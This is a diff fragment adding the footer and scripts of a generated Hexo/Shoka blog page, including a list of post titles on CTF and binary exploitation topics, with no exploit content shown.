+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/14/house-of-cat/" title="house_of_cat">house_of_cat</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/01/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" title="DASCTF_X_CBCTF_2022九月挑战赛">DASCTF_X_CBCTF_2022九月挑战赛</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/03/31/babyheap/" title="0ctf2017_babyheap（学长的wp微改，学习用）">0ctf2017_babyheap（学长的wp微改，学习用）</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/" title="debug信息修改">debug信息修改</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/" title="周报模板">周报模板</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/01/16/%E6%80%BB%E7%BB%93/" title="总结">总结</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/03/31/babyheap/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
